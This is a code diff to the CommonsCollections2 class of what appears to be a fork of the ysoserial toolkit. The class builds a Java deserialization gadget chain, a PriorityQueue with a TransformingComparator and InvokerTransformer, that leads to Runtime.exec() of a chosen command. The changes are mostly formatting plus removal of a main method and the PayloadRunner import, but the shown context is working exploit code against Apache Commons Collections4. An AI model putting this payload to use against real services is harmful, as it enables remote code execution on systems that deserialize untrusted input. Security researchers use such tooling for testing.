@@ -9,7 +9,6 @@ import org.apache.commons.collections4.functors.InvokerTransformer;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 
@@ -24,9 +23,9 @@ import org.su18.ysuserial.payloads.util.Reflections;
 								Runtime.exec()
  */
 
-@SuppressWarnings({ "rawtypes", "unchecked" })
-@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
-@Authors({ Authors.FROHOFF })
+@SuppressWarnings({"rawtypes", "unchecked"})
+@Dependencies({"org.apache.commons:commons-collections4:4.0"})
+@Authors({Authors.FROHOFF})
 public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 
 	public Queue<Object> getObject(final String command) throws Exception {
@@ -35,7 +34,7 @@ public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
 		// create queue with numbers and basic comparator
-		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
+		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
 		// stub data for replacement later
 		queue.add(1);
 		queue.add(1);
@@ -50,9 +49,4 @@ public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 
 		return queue;
 	}
-
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsCollections2.class, args);
-	}
-
 }
